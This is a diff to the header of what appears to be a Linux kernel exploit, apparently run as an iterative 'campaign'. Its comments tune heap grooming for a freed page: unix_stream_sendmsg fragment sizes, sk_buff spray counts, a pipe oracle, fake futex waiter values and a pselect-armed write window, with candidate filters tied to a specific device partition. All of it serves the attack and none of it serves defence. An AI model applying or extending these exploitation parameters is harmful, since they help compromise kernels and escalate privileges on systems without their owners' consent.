@@ -23,6 +23,18 @@
 #define KMALLOC_CGROUP_TYPE 1
 #define KMALLOC_CACHE_TYPES 3
 
+/* Campaign 20 (windowfix): one order-3 fragment per slide send.
+ * unix_stream_sendmsg splits a 0x10000 send at 0x8e80; chunk B's linear head
+ * is markerless and its fragment carries the -0x1000 bias, so a 0x10000 send
+ * gives the freed page a markerless second home (analysis gatemiss §2.4).
+ * 0x8e80 produces exactly one fragment whose first user byte (0xe80) is page
+ * offset 0, the SKB_DATA_DELTA=-0xe80 F1 geometry.  Slide-only: the pipe
+ * oracle prep (pipe.c) and the later fops page keep their 0x10000 two-frag
+ * spray. 4 -> 16 sends matches the other 0x8e80 targets and stays inside the
+ * non-fresh 1 MiB SO_SNDBUF (16*0x8e80=0x8e800). */
+#define SLIDE_SKB_SEND_SIZE 0x8e80
+#define SKB_RECLAIM_SENDS 16
+
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
@@ -73,6 +85,17 @@
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define APP_ACCEPT_SCHED_TRIGGER 1
+/* Campaign 20: arm the pselect write window with a dedicated pipe read end
+ * (read-set word g0) and a consumer kick after sched_setattr_tid; the gate
+ * then requires slide_stack_write_window, not just the sched return
+ * (analysis gatemiss §0.4/§5.2.3).  The window pipe replaces the timerfd,
+ * which could only expire (ret=0) and never armed the window. */
+#define APP_SLIDE_WINDOW_PIPE 1
+/* Reject non-fresh mm candidates below PR #303's device-validated UEDZE4
+ * partition; index 22 means the slab was not fully reclaimed (gatemiss §3). */
+#define APP_SLIDE_MIN_OBJECT_INDEX 27
+/* Bound fresh-page gate retries on a reclaim or window miss. */
+#define APP_SLIDE_GATE_ATTEMPTS 3
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 4096
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
